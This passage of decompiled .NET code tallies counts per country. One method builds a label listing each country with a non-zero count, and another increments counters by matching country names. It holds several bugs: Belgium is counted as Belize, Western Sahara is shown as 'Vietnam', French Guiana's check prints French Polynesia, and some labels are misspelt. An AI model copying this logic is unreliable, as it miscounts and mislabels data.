		{
			Label label105 = Label1;
			label105.set_Text((label105.get_Text() + "\r\nSlovakia : " + Conversions.ToString(Slovakia)).ToString());
		}
		if (Slovenia != 0)
		{
			Label label106 = Label1;
			label106.set_Text((label106.get_Text() + "\r\nSlovenia : " + Conversions.ToString(Slovenia)).ToString());
		}
		if (SolomonIslands != 0)
		{
			Label label107 = Label1;
			label107.set_Text((label107.get_Text() + "\r\nSolomon Islands : " + Conversions.ToString(SolomonIslands)).ToString());
		}
		if (Somalia != 0)
		{
			Label label108 = Label1;
			label108.set_Text((label108.get_Text() + "\r\nSomalia : " + Conversions.ToString(Somalia)).ToString());
		}
		if (SouthAfrica != 0)
		{
			Label label109 = Label1;
			label109.set_Text((label109.get_Text() + "\r\nSouth Africa : " + Conversions.ToString(SouthAfrica)).ToString());
		}
		if (SouthGeorgiaandtheSouthSandwichIslands != 0)
		{
			Label label110 = Label1;
			label110.set_Text((label110.get_Text() + "\r\nSouth Georgia and the South Sandwich Islands : " + Conversions.ToString(SouthGeorgiaandtheSouthSandwichIslands)).ToString());
		}
		if (Spain != 0)
		{
			Label label111 = Label1;
			label111.set_Text((label111.get_Text() + "\r\nSpain : " + Conversions.ToString(Spain)).ToString());
		}
		if (SriLanka != 0)
		{
			Label label112 = Label1;
			label112.set_Text((label112.get_Text() + "\r\nSri Lanka : " + Conversions.ToString(SriLanka)).ToString());
		}
		if (Sudan != 0)
		{
			Label label113 = Label1;
			label113.set_Text((label113.get_Text() + "\r\nSudan : " + Conversions.ToString(Sudan)).ToString());
		}
		if (Suriname != 0)
		{
			Label label114 = Label1;
			label114.set_Text((label114.get_Text() + "\r\nSuriname : " + Conversions.ToString(Suriname)).ToString());
		}
		if (SvalbardandJanMayen != 0)
		{
			Label label115 = Label1;
			label115.set_Text((label115.get_Text() + "\r\nSvalbard and Jan Mayen : " + Conversions.ToString(SvalbardandJanMayen)).ToString());
		}
		if (Swaziland != 0)
		{
			Label label116 = Label1;
			label116.set_Text((label116.get_Text() + "\r\nSwaziland : " + Conversions.ToString(Swaziland)).ToString());
		}
		if (Sweden != 0)
		{
			Label label117 = Label1;
			label117.set_Text((label117.get_Text() + "\r\nSweden : " + Conversions.ToString(Sweden)).ToString());
		}
		if (Switzerland != 0)
		{
			Label label118 = Label1;
			label118.set_Text((label118.get_Text() + "\r\nSwitzerland : " + Conversions.ToString(Switzerland)).ToString());
		}
		if (Syria != 0)
		{
			Label label119 = Label1;
			label119.set_Text((label119.get_Text() + "\r\nSyria : " + Conversions.ToString(Syria)).ToString());
		}
		if (Taiwan != 0)
		{
			Label label120 = Label1;
			label120.set_Text((label120.get_Text() + "\r\nTaiwan : " + Conversions.ToString(Taiwan)).ToString());
		}
		if (Tajikistan != 0)
		{
			Label label121 = Label1;
			label121.set_Text((label121.get_Text() + "\r\nTajikistan : " + Conversions.ToString(Tajikistan)).ToString());
		}
		if (UnitedRepublicofTanzania != 0)
		{
			Label label122 = Label1;
			label122.set_Text((label122.get_Text() + "\r\nUnited Republic of Tanzania : " + Conversions.ToString(UnitedRepublicofTanzania)).ToString());
		}
		if (Thailand != 0)
		{
			Label label123 = Label1;
			label123.set_Text((label123.get_Text() + "\r\nThailand : " + Conversions.ToString(Thailand)).ToString());
		}
		if (Togo != 0)
		{
			Label label124 = Label1;
			label124.set_Text((label124.get_Text() + "\r\nTogo : " + Conversions.ToString(Togo)).ToString());
		}
		if (Tokelau != 0)
		{
			Label label125 = Label1;
			label125.set_Text((label125.get_Text() + "\r\nTokelau : " + Conversions.ToString(Tokelau)).ToString());
		}
		if (Tonga != 0)
		{
			Label label126 = Label1;
			label126.set_Text((label126.get_Text() + "\r\nTonga : " + Conversions.ToString(Tonga)).ToString());
		}
		if (TrinidadAndTobago != 0)
		{
			Label label127 = Label1;
			label127.set_Text((label127.get_Text() + "\r\nTrinidad and Tobago : " + Conversions.ToString(TrinidadAndTobago)).ToString());
		}
		if (Tunisia != 0)
		{
			Label label128 = Label1;
			label128.set_Text((label128.get_Text() + "\r\nTunisia : " + Conversions.ToString(Tunisia)).ToString());
		}
		if (Turkey != 0)
		{
			Label label129 = Label1;
			label129.set_Text((label129.get_Text() + "\r\nTurkey : " + Conversions.ToString(Turkey)).ToString());
		}
		if (Turkmenistan != 0)
		{
			Label label130 = Label1;
			label130.set_Text((label130.get_Text() + "\r\nTurkmenistan : " + Conversions.ToString(Turkmenistan)).ToString());
		}
		if (TurksandCaicosIslands != 0)
		{
			Label label131 = Label1;
			label131.set_Text((label131.get_Text() + "\r\nTurks and Caicos Islands : " + Conversions.ToString(TurksandCaicosIslands)).ToString());
		}
		if (Tuvalu != 0)
		{
			Label label132 = Label1;
			label132.set_Text((label132.get_Text() + "\r\nTuvalu : " + Conversions.ToString(Tuvalu)).ToString());
		}
		if (Uganda != 0)
		{
			Label label133 = Label1;
			label133.set_Text((label133.get_Text() + "\r\nUganda : " + Conversions.ToString(Uganda)).ToString());
		}
		if (Ukraine != 0)
		{
			Label label134 = Label1;
			label134.set_Text((label134.get_Text() + "\r\nUkraine : " + Conversions.ToString(Ukraine)).ToString());
		}
		if (UnitedArabEmirates != 0)
		{
			Label label135 = Label1;
			label135.set_Text((label135.get_Text() + "\r\nUnited Arab Emirates : " + Conversions.ToString(UnitedArabEmirates)).ToString());
		}
		if (UnitedKingdom != 0)
		{
			Label label136 = Label1;
			label136.set_Text((label136.get_Text() + "\r\nUnited Kingdom : " + Conversions.ToString(UnitedKingdom)).ToString());
		}
		if (UnitedStatesMinorOutlyingIslands != 0)
		{
			Label label137 = Label1;
			label137.set_Text((label137.get_Text() + "\r\nUnited States Minor Outlying Islands : " + Conversions.ToString(UnitedStatesMinorOutlyingIslands)).ToString());
		}
		if (UnitedStates != 0)
		{
			Label label138 = Label1;
			label138.set_Text((label138.get_Text() + "\r\nUnited States : " + Conversions.ToString(UnitedStates)).ToString());
		}
		if (Uruguay != 0)
		{
			Label label139 = Label1;
			label139.set_Text((label139.get_Text() + "\r\nUruguay : " + Conversions.ToString(Uruguay)).ToString());
		}
		if (Uzbekistan != 0)
		{
			Label label140 = Label1;
			label140.set_Text((label140.get_Text() + "\r\nUzbek  istan : " + Conversions.ToString(Uzbekistan)).ToString());
		}
		if (Wales != 0)
		{
			Label label141 = Label1;
			label141.set_Text((label141.get_Text() + "\r\nWales : " + Conversions.ToString(Wales)).ToString());
		}
		if (WallisAndFutuna != 0)
		{
			Label label142 = Label1;
			label142.set_Text((label142.get_Text() + "\r\nWallis and Futuna : " + Conversions.ToString(WallisAndFutuna)).ToString());
		}
		if (Vanuatu != 0)
		{
			Label label143 = Label1;
			label143.set_Text((label143.get_Text() + "\r\nVanuatu : " + Conversions.ToString(Vanuatu)).ToString());
		}
		if (VaticanCityState != 0)
		{
			Label label144 = Label1;
			label144.set_Text((label144.get_Text() + "\r\nVatican City State : " + Conversions.ToString(VaticanCityState)).ToString());
		}
		if (Venezuela != 0)
		{
			Label label145 = Label1;
			label145.set_Text((label145.get_Text() + "\r\nVenezuela : " + Conversions.ToString(Venezuela)).ToString());
		}
		if (WesternSahara != 0)
		{
			Label label146 = Label1;
			label146.set_Text((label146.get_Text() + "\r\nVietnam: " + Conversions.ToString(WesternSahara)).ToString());
		}
		if (Vietnam != 0)
		{
			Label label147 = Label1;
			label147.set_Text((label147.get_Text() + "\r\nVietnam : " + Conversions.ToString(Vietnam)).ToString());
		}
		if (UnitedStatesVirginIslands != 0)
		{
			Label label148 = Label1;
			label148.set_Text((label148.get_Text() + "\r\nUnited States Virgin Islands : " + Conversions.ToString(UnitedStatesVirginIslands)).ToString());
		}
		if (Yemen != 0)
		{
			Label label149 = Label1;
			label149.set_Text((label149.get_Text() + "\r\nYemen : " + Conversions.ToString(Yemen)).ToString());
		}
		if (Zambia != 0)
		{
			Label label150 = Label1;
			label150.set_Text((label150.get_Text() + "\r\nZambia : " + Conversions.ToString(Zambia)).ToString());
		}
		if (Zimbabwe != 0)
		{
			Label label151 = Label1;
			label151.set_Text((label151.get_Text() + "\r\nZimbabwe : " + Conversions.ToString(Zimbabwe)).ToString());
		}
		if (CookIslands != 0)
		{
			Label label152 = Label1;
			label152.set_Text((label152.get_Text() + "\r\nCook Islands : " + Conversions.ToString(CookIslands)).ToString());
		}
		if (Antarctica != 0)
		{
			Label label153 = Label1;
			label153.set_Text((label153.get_Text() + "\r\nAntarctica : " + Conversions.ToString(Antarctica)).ToString());
		}
		if (Congo != 0)
		{
			Label label154 = Label1;
			label154.set_Text((label154.get_Text() + "\r\nCongo : " + Conversions.ToString(Congo)).ToString());
		}
		if (CoteDIvoire != 0)
		{
			Label label155 = Label1;
			label155.set_Text((label155.get_Text() + "\r\nCote D'Ivoire : " + Conversions.ToString(CoteDIvoire)).ToString());
		}
		if (SatelliteProvider != 0)
		{
			Label label156 = Label1;
			label156.set_Text((label156.get_Text() + "\r\nSatellite Provider : " + Conversions.ToString(SatelliteProvider)).ToString());
		}
		if (AlandIslands != 0)
		{
			Label label157 = Label1;
			label157.set_Text((label157.get_Text() + "\r\nAland Islands : " + Conversions.ToString(AlandIslands)).ToString());
		}
		if (Guernsey != 0)
		{
			Label label158 = Label1;
			label158.set_Text((label158.get_Text() + "\r\nGuernsey : " + Conversions.ToString(Guernsey)).ToString());
		}
		if (IsleofMan != 0)
		{
			Label label159 = Label1;
			label159.set_Text((label159.get_Text() + "\r\nIsle of Man : " + Conversions.ToString(IsleofMan)).ToString());
		}
		if (Jersey != 0)
		{
			Label label160 = Label1;
			label160.set_Text((label160.get_Text() + "\r\nJersey : " + Conversions.ToString(Jersey)).ToString());
		}
		if (SaintBarthelemy != 0)
		{
			Label label161 = Label1;
			label161.set_Text((label161.get_Text() + "\r\nSaint Barthelemy : " + Conversions.ToString(SaintBarthelemy)).ToString());
		}
		if (Guinea != 0)
		{
			Label label162 = Label1;
			label162.set_Text((label162.get_Text() + "\r\nGuinea : " + Conversions.ToString(Guinea)).ToString());
		}
		if (Guatemala != 0)
		{
			Label label163 = Label1;
			label163.set_Text((label163.get_Text() + "\r\nGuatemala : " + Conversions.ToString(Guatemala)).ToString());
		}
		if (Guam != 0)
		{
			Label label164 = Label1;
			label164.set_Text((label164.get_Text() + "\r\nGuam : " + Conversions.ToString(Guam)).ToString());
		}
		if (Guadeloupe != 0)
		{
			Label label165 = Label1;
			label165.set_Text((label165.get_Text() + "\r\nGuadeloupe : " + Conversions.ToString(Guadeloupe)).ToString());
		}
		if (Grenada != 0)
		{
			Label label166 = Label1;
			label166.set_Text((label166.get_Text() + "\r\nGrenada : " + Conversions.ToString(Grenada)).ToString());
		}
		if (Greenland != 0)
		{
			Label label167 = Label1;
			label167.set_Text((label167.get_Text() + "\r\nGreenland : " + Conversions.ToString(Greenland)).ToString());
		}
		if (Greece != 0)
		{
			Label label168 = Label1;
			label168.set_Text((label168.get_Text() + "\r\nGreece : " + Conversions.ToString(Greece)).ToString());
		}
		if (Gibraltar != 0)
		{
			Label label169 = Label1;
			label169.set_Text((label169.get_Text() + "\r\nGibraltar : " + Conversions.ToString(Gibraltar)).ToString());
		}
		if (Ghana != 0)
		{
			Label label170 = Label1;
			label170.set_Text((label170.get_Text() + "\r\nGhana : " + Conversions.ToString(Ghana)).ToString());
		}
		if (Germany != 0)
		{
			Label label171 = Label1;
			label171.set_Text((label171.get_Text() + "\r\nGermany : " + Conversions.ToString(Germany)).ToString());
		}
		if (Georgia != 0)
		{
			Label label172 = Label1;
			label172.set_Text((label172.get_Text() + "\r\nGeorgia : " + Conversions.ToString(Georgia)).ToString());
		}
		if (Gambia != 0)
		{
			Label label173 = Label1;
			label173.set_Text((label173.get_Text() + "\r\nGambia : " + Conversions.ToString(Gambia)).ToString());
		}
		if (Gabon != 0)
		{
			Label label174 = Label1;
			label174.set_Text((label174.get_Text() + "\r\nGabon : " + Conversions.ToString(Gabon)).ToString());
		}
		if (FrenchSouthernTerritories != 0)
		{
			Label label175 = Label1;
			label175.set_Text((label175.get_Text() + "\r\nFrench Southern Territories : " + Conversions.ToString(FrenchSouthernTerritories)).ToString());
		}
		if (FrenchGuiana != 0)
		{
			Label label176 = Label1;
			label176.set_Text((label176.get_Text() + "\r\nFrench Polynesia : " + Conversions.ToString(FrenchPolynesia)).ToString());
		}
		if (France != 0)
		{
			Label label177 = Label1;
			label177.set_Text((label177.get_Text() + "\r\nFrance : " + Conversions.ToString(France)).ToString());
		}
		if (Finland != 0)
		{
			Label label178 = Label1;
			label178.set_Text((label178.get_Text() + "\r\nFinland : " + Conversions.ToString(Finland)).ToString());
		}
		if (Fiji != 0)
		{
			Label label179 = Label1;
			label179.set_Text((label179.get_Text() + "\r\nFiji : " + Conversions.ToString(Fiji)).ToString());
		}
		if (FaroeIslands != 0)
		{
			Label label180 = Label1;
			label180.set_Text((label180.get_Text() + "\r\nFaroe Islands : " + Conversions.ToString(FaroeIslands)).ToString());
		}
		if (Afghanistan != 0)
		{
			Label label181 = Label1;
			label181.set_Text((label181.get_Text() + "\r\nAfghanistan : " + Conversions.ToString(Afghanistan)).ToString());
		}
		if (Albania != 0)
		{
			Label label182 = Label1;
			label182.set_Text((label182.get_Text() + "\r\nAlbania : " + Conversions.ToString(Albania)).ToString());
		}
		if (Algeria != 0)
		{
			Label label183 = Label1;
			label183.set_Text((label183.get_Text() + "\r\nAlgeria : " + Conversions.ToString(Algeria)).ToString());
		}
		if (AmericanSamoa != 0)
		{
			Label label184 = Label1;
			label184.set_Text((label184.get_Text() + "\r\nAmerican Samoa : " + Conversions.ToString(AmericanSamoa)).ToString());
		}
		if (Andorra != 0)
		{
			Label label185 = Label1;
			label185.set_Text((label185.get_Text() + "\r\nAndorra : " + Conversions.ToString(Andorra)).ToString());
		}
		if (Angola != 0)
		{
			Label label186 = Label1;
			label186.set_Text((label186.get_Text() + "\r\nAngola : " + Conversions.ToString(Angola)).ToString());
		}
		if (Anguilla != 0)
		{
			Label label187 = Label1;
			label187.set_Text((label187.get_Text() + "\r\nAnguilla : " + Conversions.ToString(Anguilla)).ToString());
		}
		if (AntiguaandBarbuda != 0)
		{
			Label label188 = Label1;
			label188.set_Text((label188.get_Text() + "\r\nAntigua and Barbuda" + Conversions.ToString(AntiguaandBarbuda)).ToString());
		}
		if (Argentina != 0)
		{
			Label label189 = Label1;
			label189.set_Text((label189.get_Text() + "\r\nArgentina : " + Conversions.ToString(Argentina)).ToString());
		}
		if (Armenia != 0)
		{
			Label label190 = Label1;
			label190.set_Text((label190.get_Text() + "\r\nArmenia : " + Conversions.ToString(Armenia)).ToString());
		}
		if (Aruba != 0)
		{
			Label label191 = Label1;
			label191.set_Text((label191.get_Text() + "\r\nAruba : " + Conversions.ToString(Aruba)).ToString());
		}
		if (Australia != 0)
		{
			Label label192 = Label1;
			label192.set_Text((label192.get_Text() + "\r\nAustralia : " + Conversions.ToString(Australia)).ToString());
		}
		if (Austria != 0)
		{
			Label label193 = Label1;
			label193.set_Text((label193.get_Text() + "\r\nAustria : " + Conversions.ToString(Austria)).ToString());
		}
		if (Azerbaijan != 0)
		{
			Label label194 = Label1;
			label194.set_Text((label194.get_Text() + "\r\nAzerbaijan : " + Conversions.ToString(Azerbaijan)).ToString());
		}
		if (Bahamas != 0)
		{
			Label label195 = Label1;
			label195.set_Text((label195.get_Text() + "\r\nBahamas : " + Conversions.ToString(Bahamas)).ToString());
		}
		if (Bahrain != 0)
		{
			Label label196 = Label1;
			label196.set_Text((label196.get_Text() + "\r\nBahrain : " + Conversions.ToString(Bahrain)).ToString());
		}
		if (Bangladesh != 0)
		{
			Label label197 = Label1;
			label197.set_Text((label197.get_Text() + "\r\nBangladesh : " + Conversions.ToString(Bangladesh)).ToString());
		}
		if (Barbados != 0)
		{
			Label label198 = Label1;
			label198.set_Text((label198.get_Text() + "\r\nBarbados : " + Conversions.ToString(Barbados)).ToString());
		}
		if (Belarus != 0)
		{
			Label label199 = Label1;
			label199.set_Text((label199.get_Text() + "\r\nBelarus : " + Conversions.ToString(Belarus)).ToString());
		}
		if (Belgium != 0)
		{
			Label label200 = Label1;
			label200.set_Text((label200.get_Text() + "\r\nBelgium : " + Conversions.ToString(Belgium)).ToString());
		}
		if (Belize != 0)
		{
			Label label201 = Label1;
			label201.set_Text((label201.get_Text() + "\r\nBelize : " + Conversions.ToString(Belize)).ToString());
		}
		if (Benin != 0)
		{
			Label label202 = Label1;
			label202.set_Text((label202.get_Text() + "\r\nBenin : " + Conversions.ToString(Benin)).ToString());
		}
		if (Bermuda != 0)
		{
			Label label203 = Label1;
			label203.set_Text((label203.get_Text() + "\r\nBermuda : " + Conversions.ToString(Bermuda)).ToString());
		}
		if (Bhutan != 0)
		{
			Label label204 = Label1;
			label204.set_Text((label204.get_Text() + "\r\nBhutan : " + Conversions.ToString(Bhutan)).ToString());
		}
		if (Bolivia != 0)
		{
			Label label205 = Label1;
			label205.set_Text((label205.get_Text() + "\r\nBolivia : " + Conversions.ToString(Bolivia)).ToString());
		}
		if (BosniaandHerzegovina != 0)
		{
			Label label206 = Label1;
			label206.set_Text((label206.get_Text() + "\r\nBosnia and Herzegovina : " + Conversions.ToString(BosniaandHerzegovina)).ToString());
		}
		if (Botswana != 0)
		{
			Label label207 = Label1;
			label207.set_Text((label207.get_Text() + "\r\nBotswana : " + Conversions.ToString(Botswana)).ToString());
		}
		if (BouvetIsland != 0)
		{
			Label label208 = Label1;
			label208.set_Text((label208.get_Text() + "\r\nBouvet Island : " + Conversions.ToString(BouvetIsland)).ToString());
		}
		if (Brazil != 0)
		{
			Label label209 = Label1;
			label209.set_Text((label209.get_Text() + "\r\nBrazil : " + Conversions.ToString(Brazil)).ToString());
		}
		if (BritishIndianOceanTerritory != 0)
		{
			Label label210 = Label1;
			label210.set_Text((label210.get_Text() + "\r\nBritish Indian Ocean Territory : " + Conversions.ToString(BritishIndianOceanTerritory)).ToString());
		}
		if (BritishVirginIsland != 0)
		{
			Label label211 = Label1;
			label211.set_Text((label211.get_Text() + "\r\nBritish Virgin Island : " + Conversions.ToString(BritishVirginIsland)).ToString());
		}
		if (BruneiDarussalam != 0)
		{
			Label label212 = Label1;
			label212.set_Text((label212.get_Text() + "\r\nBrunei Darussalam : " + Conversions.ToString(BruneiDarussalam)).ToString());
		}
		if (Bulgaria != 0)
		{
			Label label213 = Label1;
			label213.set_Text((label213.get_Text() + "\r\nBulgaria : " + Conversions.ToString(Bulgaria)).ToString());
		}
		if (BurkinaFaso != 0)
		{
			Label label214 = Label1;
			label214.set_Text((label214.get_Text() + "\r\nBurkina Faso : " + Conversions.ToString(BurkinaFaso)).ToString());
		}
		if (Burundi != 0)
		{
			Label label215 = Label1;
			label215.set_Text((label215.get_Text() + "\r\nBurundi : " + Conversions.ToString(Burundi)).ToString());
		}
		if (Cambodia != 0)
		{
			Label label216 = Label1;
			label216.set_Text((label216.get_Text() + "\r\nCambodia : " + Conversions.ToString(Cambodia)).ToString());
		}
		if (Cameroon != 0)
		{
			Label label217 = Label1;
			label217.set_Text((label217.get_Text() + "\r\nCameroon : " + Conversions.ToString(Cameroon)).ToString());
		}
		if (Canada != 0)
		{
			Label label218 = Label1;
			label218.set_Text((label218.get_Text() + "\r\nCanada : " + Conversions.ToString(Canada)).ToString());
		}
		if (CVC != 0)
		{
			Label label219 = Label1;
			label219.set_Text((label219.get_Text() + "\r\nCape Verde : " + Conversions.ToString(CVC)).ToString());
		}
		if (Catalonia != 0)
		{
			Label label220 = Label1;
			label220.set_Text((label220.get_Text() + "\r\nCatalonia : " + Conversions.ToString(Catalonia)).ToString());
		}
		if (CaymanIslands != 0)
		{
			Label label221 = Label1;
			label221.set_Text((label221.get_Text() + "\r\nCayman Islands : " + Conversions.ToString(CaymanIslands)).ToString());
		}
		if (CentralAfricanRepublic != 0)
		{
			Label label222 = Label1;
			label222.set_Text((label222.get_Text() + "\r\nCentral African Republic : " + Conversions.ToString(CentralAfricanRepublic)).ToString());
		}
		if (Chad != 0)
		{
			Label label223 = Label1;
			label223.set_Text((label223.get_Text() + "\r\nChad : " + Conversions.ToString(Chad)).ToString());
		}
		if (Chile != 0)
		{
			Label label224 = Label1;
			label224.set_Text((label224.get_Text() + "\r\nChile : " + Conversions.ToString(Chile)).ToString());
		}
		if (China != 0)
		{
			Label label225 = Label1;
			label225.set_Text((label225.get_Text() + "\r\nChina : " + Conversions.ToString(China)).ToString());
		}
		if (ChristmasIsland != 0)
		{
			Label label226 = Label1;
			label226.set_Text((label226.get_Text() + "\r\nChristmas Island : " + Conversions.ToString(ChristmasIsland)).ToString());
		}
		if (CCKI != 0)
		{
			Label label227 = Label1;
			label227.set_Text((label227.get_Text() + "\r\nCocos (Keeling Islands) : " + Conversions.ToString(CCKI)).ToString());
		}
		if (Colombia != 0)
		{
			Label label228 = Label1;
			label228.set_Text((label228.get_Text() + "\r\nColombia : " + Conversions.ToString(Colombia)).ToString());
		}
		if (Comoros != 0)
		{
			Label label229 = Label1;
			label229.set_Text((label229.get_Text() + "\r\nComoros : " + Conversions.ToString(Comoros)).ToString());
		}
		if (DemocraticRepublicoftheCongo != 0)
		{
			Label label230 = Label1;
			label230.set_Text((label230.get_Text() + "\r\nDemocratic Republic of the Congo : " + Conversions.ToString(DemocraticRepublicoftheCongo)).ToString());
		}
		if (CostaRica != 0)
		{
			Label label231 = Label1;
			label231.set_Text((label231.get_Text() + "\r\nCosta Rica : " + Conversions.ToString(CostaRica)).ToString());
		}
		if (Croatia != 0)
		{
			Label label232 = Label1;
			label232.set_Text((label232.get_Text() + "\r\nCroatia : " + Conversions.ToString(Croatia)).ToString());
		}
		if (Cuba != 0)
		{
			Label label233 = Label1;
			label233.set_Text((label233.get_Text() + "\r\nCuba : " + Conversions.ToString(Cuba)).ToString());
		}
		if (Cyprus != 0)
		{
			Label label234 = Label1;
			label234.set_Text((label234.get_Text() + "\r\nCyprus : " + Conversions.ToString(Cyprus)).ToString());
		}
		if (CzechRepublic != 0)
		{
			Label label235 = Label1;
			label235.set_Text((label235.get_Text() + "\r\nCzech Republic : " + Conversions.ToString(CzechRepublic)).ToString());
		}
		if (Denmark != 0)
		{
			Label label236 = Label1;
			label236.set_Text((label236.get_Text() + "\r\nDenmark : " + Conversions.ToString(Denmark)).ToString());
		}
		if (Djibouti != 0)
		{
			Label label237 = Label1;
			label237.set_Text((label237.get_Text() + "\r\nDjibouti : " + Conversions.ToString(Djibouti)).ToString());
		}
		if (Dominica != 0)
		{
			Label label238 = Label1;
			label238.set_Text((label238.get_Text() + "\r\nDominica : " + Conversions.ToString(Dominica)).ToString());
		}
		if (DominicanRepublic != 0)
		{
			Label label239 = Label1;
			label239.set_Text((label239.get_Text() + "\r\nDominican Republic : " + Conversions.ToString(DominicanRepublic)).ToString());
		}
		if (Ecuador != 0)
		{
			Label label240 = Label1;
			label240.set_Text((label240.get_Text() + "\r\nEcuador : " + Conversions.ToString(Ecuador)).ToString());
		}
		if (Egypt != 0)
		{
			Label label241 = Label1;
			label241.set_Text((label241.get_Text() + "\r\nEgypt : " + Conversions.ToString(Egypt)).ToString());
		}
		if (ElSalvador != 0)
		{
			Label label242 = Label1;
			label242.set_Text((label242.get_Text() + "\r\nEl Salvador : " + Conversions.ToString(ElSalvador)).ToString());
		}
		if (England != 0)
		{
			Label label243 = Label1;
			label243.set_Text((label243.get_Text() + "\r\nEngland : " + Conversions.ToString(England)).ToString());
		}
		if (EquatorialGuinea != 0)
		{
			Label label244 = Label1;
			label244.set_Text((label244.get_Text() + "\r\nEquatorial Guinea : " + Conversions.ToString(EquatorialGuinea)).ToString());
		}
		if (Eritrea != 0)
		{
			Label label245 = Label1;
			label245.set_Text((label245.get_Text() + "\r\nEritrea : " + Conversions.ToString(Eritrea)).ToString());
		}
		if (Estonia != 0)
		{
			Label label246 = Label1;
			label246.set_Text((label246.get_Text() + "\r\nEstonia : " + Conversions.ToString(Estonia)).ToString());
		}
		if (Ethiopia != 0)
		{
			Label label247 = Label1;
			label247.set_Text((label247.get_Text() + "\r\nEthiopia : " + Conversions.ToString(Ethiopia)).ToString());
		}
		if (Europe != 0)
		{
			Label label248 = Label1;
			label248.set_Text((label248.get_Text() + "\r\nEurope : " + Conversions.ToString(Europe)).ToString());
		}
		if (FalklandIslandsMalvinas != 0)
		{
			Label label249 = Label1;
			label249.set_Text((label249.get_Text() + "\r\nFalkland Islands (Malvinas) : " + Conversions.ToString(FalklandIslandsMalvinas)).ToString());
		}
		if (NA != 0)
		{
			Label label250 = Label1;
			label250.set_Text((label250.get_Text() + "\r\nUnknown : " + Conversions.ToString(NA)).ToString());
		}
		string result = default(string);
		return result;
	}

	public string AVTI(string CC)
	{
		checked
		{
			if (Operators.CompareString(CC, Strings.UCase("Afghanistan"), false) == 0)
			{
				Afghanistan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Albania"), false) == 0)
			{
				Albania++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Algeria"), false) == 0)
			{
				Algeria++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("American Samoa"), false) == 0)
			{
				AmericanSamoa++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Andorra"), false) == 0)
			{
				Andorra++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Angola"), false) == 0)
			{
				Angola++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Anguilla"), false) == 0)
			{
				Anguilla++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Antigua & Barbuda"), false) == 0)
			{
				AntiguaandBarbuda++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Argentina"), false) == 0)
			{
				Argentina++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Armenia"), false) == 0)
			{
				Armenia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Aruba"), false) == 0)
			{
				Aruba++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Australia"), false) == 0)
			{
				Australia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Austria"), false) == 0)
			{
				Austria++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Azerbaijan"), false) == 0)
			{
				Azerbaijan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Bahamas"), false) == 0)
			{
				Bahamas++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Bahrain"), false) == 0)
			{
				Bahrain++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Bangladesh"), false) == 0)
			{
				Bangladesh++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Barbados"), false) == 0)
			{
				Barbados++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Belarus"), false) == 0)
			{
				Belarus++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Belgium"), false) == 0)
			{
				Belize++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Belize"), false) == 0)
			{
				Belize++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Benin"), false) == 0)
			{
				Benin++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Bermuda"), false) == 0)
			{
				Bermuda++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Bhutan"), false) == 0)
			{
				Bhutan++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Bolivia"), false) == 0)
			{
				Bolivia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Bosnia & Herzegovina"), false) == 0)
			{
				BosniaandHerzegovina++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Botswana"), false) == 0)
			{
				Botswana++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Bouvet Island"), false) == 0)
			{
				BouvetIsland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Brazil"), false) == 0)
			{
				Brazil++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("British Indian Ocean Territory"), false) == 0)
			{
				BritishIndianOceanTerritory++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Virgin Islands British"), false) == 0)
			{
				BritishVirginIsland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Brunei"), false) == 0)
			{
				BruneiDarussalam++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Bulgaria"), false) == 0)
			{
				Bulgaria++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Burkina Faso"), false) == 0)
			{
				BurkinaFaso++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Burundi"), false) == 0)
			{
				Burundi++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Cambodia"), false) == 0)
			{
				Cambodia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Cameroon"), false) == 0)
			{
				Cameroon++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Canada"), false) == 0)
			{
				Canada++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Cape Verde"), false) == 0)
			{
				CVC++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Catalonia"), false) == 0)
			{
				Catalonia++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Cayman Islands"), false) == 0)
			{
				CaymanIslands++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Central African Republic"), false) == 0)
			{
				CentralAfricanRepublic++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Chad"), false) == 0)
			{
				Chad++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Chile"), false) == 0)
			{
				Chile++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("China"), false) == 0)
			{
				China++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Christmas Island"), false) == 0)
			{
				ChristmasIsland++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Cocos (Keeling) Islands"), false) == 0)
			{
				CCKI++;
			}
			else if (Operators.CompareString(CC, Strings.UCase("Colombia"), false) == 0)
			{
				Colombia++;
			}
